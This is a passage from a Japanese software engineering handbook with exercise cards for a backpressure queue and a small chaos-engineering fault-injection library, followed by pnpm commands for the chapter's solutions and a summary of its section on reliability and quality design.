**目的**: 過負荷時に「処理能力以上のリクエストを受けない」ように制御。

<!-- handbook:exercise:start {"id":"26.5"} -->
> **演習カード 課題26.5** ― 難易度 ★★★ ／ 推定時間 150分 ／ 必要サービス: なし
>
> **前提**
>
> - 26.11 バックプレッシャー ― 過負荷の連鎖を防ぐ を読み、highWaterMark が何を表すかを説明できる
> - Node.js の Readable と Writable の highWaterMark と drain イベントの対応を知っている
> - Promise を保持して後から resolve する待機者リストを実装できる
> - 非同期の消費ループを二重起動させないためのフラグ制御を書ける
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] キュー長が highWaterMark 未満のとき tryPush が true を返して要素を積む
> - [ ] キューが highWaterMark に達すると tryPush が false を返し、要素を積まない
> - [ ] waitForDrain() が空きのあるときは即座に解決し、満杯のときは空きが出るまで待つ
> - [ ] consume() で登録したハンドラが、積まれた要素を順番に1件ずつ処理する
> - [ ] 消費が進んでキュー長が highWaterMark を下回った時点で、待機中の waitForDrain がすべて解決する
> - [ ] consume を登録する前に積んだ要素も、登録後に処理される
>
> **期待出力**
>
> - highWaterMark:1 のキューで tryPush(1) が true を返し、消費ハンドラが1件だけ受け取る
> - size() が現在のキュー長を返し、消費が進むと減少する
> - Producer 側のループが tryPush の false を受けて waitForDrain で待ち、Consumer の速度に律速される
>
> **観察項目**
>
> - Producer を Consumer より十分速くし、バックプレッシャーなし (無条件 push) ではキュー長が発散し、ありでは highWaterMark 付近で振動することを size() の推移で比較する
> - 消費ループが二重起動しないことを、ハンドラの入り口にカウンタを置いて確認し、順序保証がどこから来ているかを読み取る
> - 待機者を解決するタイミングを「1件処理ごと」から「全件処理後」に変えたときに、Producer の待ち時間がどう変わるかを比較する
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch26 exec tsx --test --test-name-pattern="backpressure drains" solutions.test.ts` を実行し、passすれば合格
> 2. `pnpm --filter @handbook/ch26 run test` で章の6件がすべてpassすることを確認する
> 3. 自作実装で highWaterMark:2 として3件連続 tryPush し、3件目だけ false が返れば上限判定が正しいと判定する
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: 「積む」「待つ」「消す」の3つの経路が同じキュー長を見て動く。まず同期的な tryPush と size だけを作り、そこへ非同期の消費ループと待機者の解決を足す順で組む
> 2. **構造**: items 配列と waiters 配列と consumers 配列を持ち、tryPush と consume の両方から pump() を起動する。pump は running フラグで二重起動を防ぎ、1件処理するたびにキュー長を見て waiters を splice(0) で一括解決する
> 3. **実装の要点**: pump を await せずに void で起動するため、finally で running を必ず false に戻さないと以降の消費が止まる。waitForDrain は空きがある場合に同期的に解決済み Promise を返さないと、Producer が永久に待つ
>
> **本番利用時の警告**
>
> - このキューはメモリ上の配列だけで、プロセスが落ちると未処理の要素が消える。実システムでは永続キュー (メッセージブローカ) を使い、消費の完了確認 (ack) と再配送を前提に設計する
> - 消費ハンドラが例外を投げた場合の扱いを持たないため、1件の失敗で pump のループが抜け、以降の消費が止まる。デッドレターキューやリトライを組み込まないと、静かに処理が停止する
> - バックプレッシャーは Producer 側が tryPush の戻り値を見て待つ協力があって初めて成立する。HTTPリクエストのように押し戻せない入力源では、キューではなく受付そのものを制限 (429 を返す、接続数を絞る) しないと、上流でメモリが溢れるだけになる
>
> **導線**
>
> - 開始地点: `code/ch26/backpressure.ts`
> - 模範解答: `code/ch26/backpressure.solution.ts`
>
> **推定時間の内訳**: キューと待機者管理の実装35分、消費ループと二重起動防止の実装40分、Producer と Consumer の速度差を作った観察40分、待機者解決タイミングの比較と記録35分
<!-- handbook:exercise:end -->

**要件**: Producer (高速) と Consumer (低速) のミスマッチを、キューサイズで制御:
- キューが満杯 → Producer に「待て」を伝える
- Node.js の `Readable`/`Writable` stream の `highWaterMark` と同じ概念

```typescript
const queue = new BackpressureQueue<Task>({
  highWaterMark: 100,
});

// Producer
for (const task of generateTasks()) {
  if (!queue.tryPush(task)) {
    await queue.waitForDrain(); // バックプレッシャー
    queue.tryPush(task);
  }
}

// Consumer
queue.consume(async (task) => {
  await processSlowly(task);
});
```

模範解答: `code/ch26/backpressure.solution.ts`

#### 課題26.6: Chaos Engineering ライブラリ (★★)

**目的**: 「**わざと壊す**」をコードで制御。Chaos Monkey の小型版。

<!-- handbook:exercise:start {"id":"26.6"} -->
> **演習カード 課題26.6** ― 難易度 ★★ ／ 推定時間 90分 ／ 必要サービス: なし
>
> **前提**
>
> - 26.12 Chaos Engineering ― 壊れる前に壊す を読み、定常状態の仮説と爆風半径の考え方を説明できる
> - 課題26.1 サーキットブレーカ や 課題26.2 リトライ + 指数バックオフ + jitter の実装を先に済ませ、故障注入の対象を用意しておく
> - 環境変数で機能を切り替える書き方 (process.env による分岐) を知っている
> - 乱数と sleep を注入して決定的にテストする書き方ができる
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] enabled が false のとき、ルールが一致しても元の処理がそのまま実行される
> - [ ] probability:1 かつ action:'throw' のルールで wrap した処理が、指定したエラーメッセージで reject する
> - [ ] action:'delay' のルールで delayMs の範囲内の待ち時間が挿入され、その後に元の処理が実行される
> - [ ] operation に正規表現を指定した場合、名前が一致する操作にだけルールが適用される
> - [ ] random を注入すると、どのルールが発火するかが決定的に再現する
> - [ ] 複数ルールが登録されているとき、定義順に評価される
>
> **期待出力**
>
> - chaos.wrap('op', fn) が、故障注入されない場合は fn の戻り値をそのまま返す
> - throw ルール発火時は Error のメッセージが rules で指定した文字列 (デフォルトは Chaos induced) になる
> - delay ルール発火時は delayMs の下限と上限の間の待ち時間が sleep へ渡る
>
> **観察項目**
>
> - chaos で遅延を注入した状態でサーキットブレーカ付きの呼び出しを回し、ブレーカが開くまでの回数と、開いた後の応答時間の変化を記録する
> - probability を 0.01 から 0.5 まで上げ、リトライ設定の maxAttempts が実効成功率にどう効くかを実測する
> - enabled の切り替えが環境変数由来であることを確認し、本番で誤って有効になる経路がないかをコード上でたどる
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch26 exec tsx --test --test-name-pattern="chaos engine" solutions.test.ts` を実行し、passすれば合格
> 2. `pnpm --filter @handbook/ch26 run test` で章の6件がすべてpassすることを確認する
> 3. 自作実装で enabled:false のまま probability:1 の throw ルールを与え、例外が出ずに戻り値が返れば安全側のデフォルトが守れていると判定する
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: 「壊す条件」と「壊し方」を設定データとして外に出す。ルールを配列のオブジェクトで表現し、エンジン側はそれを解釈するだけ、という分離から始める
> 2. **構造**: ルールは name と probability と action と付随パラメータを持つ型にし、wrap(name, operation) の中で操作名の正規表現照合、確率判定、action による分岐 (throw か delay) を行ってから元の処理を呼ぶ。random と sleep はオプションで注入可能にする
> 3. **実装の要点**: 有効フラグの判定は最も外側に置き、enabled が false なら確率判定にすら入らないようにする。delay の待ち時間は min + random() * (max - min) で範囲内に収め、注入した random で境界値を再現できるようにする
>
> **本番利用時の警告**
>
> - 故障注入は自分が管理する環境でのみ、事前に周知し、停止手段 (キルスイッチ) を用意したうえで行う。共用のステージングや他チームが依存する環境で無断実行すると、意図しない障害対応を発生させる
> - 有効化が enabled フラグ1つに依存しているため、環境変数の設定ミスや設定の取り違えで本番に故障注入が入りうる。本番ビルドからコードごと除外する、あるいは環境判定を二重にするなどの防御が要る
> - このエンジンは確率的な遅延と例外しか注入せず、部分的なネットワーク分断、時計のずれ、ディスク枯渇、依存の部分応答といった実際の障害モードは再現しない。ここで壊れなかったことを可用性の保証と読み替えてはいけない
>
> **導線**
>
> - 開始地点: `code/ch26/chaos-engine.ts`
> - 模範解答: `code/ch26/chaos-engine.solution.ts`
>
> **推定時間の内訳**: ルール定義とエンジンの実装30分、確率・遅延・操作名照合の実装25分、ブレーカやリトライと組み合わせた故障注入の観察25分、確率を変えた実効成功率の記録10分
<!-- handbook:exercise:end -->

**要件**:

```typescript
const chaos = new ChaosEngine({
  enabled: process.env.CHAOS === 'true',
  rules: [
    { name: 'random-latency', probability: 0.1, action: 'delay', delayMs: [500, 2000] },
    { name: 'random-error',   probability: 0.05, action: 'throw', error: 'Chaos induced' },
    { name: 'connection-reset', probability: 0.01, action: 'throw', error: 'ECONNRESET' },
  ],
});

// 任意の関数を chaos でラップ
const result = await chaos.wrap('db.query', async () => await db.query('SELECT 1'));
```

模範解答: `code/ch26/chaos-engine.solution.ts`

---

<!-- handbook:code-usage:start {"chapter":26} -->
### 第26章のコード集の使い方

<!-- handbook:generated; do not edit -->

コード集は pnpm ワークスペースとして構成してある (CODE_TOOLCHAIN.md)。依存はリポジトリ最上位で一度だけ解決し、章ごとの操作は `--filter` でワークスペースを指定する。

```bash
# 初回のみ。リポジトリ最上位で実行する
pnpm install

# 第26章の模範解答をまとめて検証する
pnpm --filter @handbook/ch26 run test

# 模範解答を個別に実行する
pnpm --filter @handbook/ch26 exec tsx circuit-breaker.solution.ts  # 課題26.1
pnpm --filter @handbook/ch26 exec tsx retry-jitter.solution.ts     # 課題26.2
pnpm --filter @handbook/ch26 exec tsx bulkhead.solution.ts         # 課題26.3
pnpm --filter @handbook/ch26 exec tsx idempotency.solution.ts      # 課題26.4
pnpm --filter @handbook/ch26 exec tsx backpressure.solution.ts     # 課題26.5
pnpm --filter @handbook/ch26 exec tsx chaos-engine.solution.ts     # 課題26.6
```

開始地点は模範解答と同じ場所に置いてある (`<name>.ts` と `<name>.solution.ts`、またはディレクトリ課題の `starter/` と `solution/`)。課題ごとの完成条件と採点手順は本節の演習カードと `code/ch26/README.md` にある。模範解答の多くは関数を export するだけで、実行して意味のある出力が出るかどうかは課題によって異なる。まず `run test` で通し、個別実行は演習カードのテスト方法に従う。
<!-- handbook:code-usage:end -->


---

## まとめ ― 第VI部の総括

第VI部では、非機能要件を独立したチェックリストではなく、互いに制約し合う品質モデルとして組み立てた。

第23章では、資産と信頼境界を定め、入力、出力、主体、権限、秘密、依存、通信路、供給網を多層で守った。第24章では、その安全な処理が利用者に届くまでの時間を、ブラウザ、ネットワーク、サーバ、DB、キャッシュへ分解した。第25章では、機能・安全性・性能を変更後も検証できるよう、失敗の種類に応じてテスト境界を配置した。第26章では、負荷と依存が増えたときの障害伝播を、容量、サービス境界、タイムアウト、リトライ、冪等性、バックプレッシャー、DRとして制御した。

これにより、品質を「後で確認するもの」ではなく、守る対象を決め、測定し、証拠を残し、故障時にも性質を維持する設計判断として扱えるようになった。ただし、これらの原則を実際の業務概念へ落とし込み、既存コードを安全に変え、AIを含む新しい実装手段を統制する方法はまだ残っている。第VII部では、ドメインモデリング、レガシー改善、AI統合、総合SaaS演習を通じて、ここまでの知識を一つの開発実践へ統合する。
